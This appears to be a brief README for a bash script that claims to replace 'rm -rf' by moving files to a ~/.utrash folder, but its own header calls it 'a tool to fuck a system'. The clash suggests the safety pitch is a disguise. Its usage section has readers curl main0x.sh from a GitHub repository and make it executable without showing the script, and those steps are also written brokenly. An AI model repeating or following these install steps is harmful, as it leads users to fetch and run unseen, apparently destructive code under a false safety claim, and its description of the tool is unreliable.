# deleting system
because rm -rf is dangerous...
this is a tool to fuck a system
# Background
Developers instinctively use rm -rf and as we all know this cannot be reversed.

This is a small bash script which will just create folder called ~/.utrash and move your file / folder
to that location instead of deleting it.

Delete stuff later with caution

# Using it
Just do the following:

`curl https://github.com/04Q/toolv/raw/master/main0x.sh `

#chmod +x main0x.sh



*and you should be good to go*
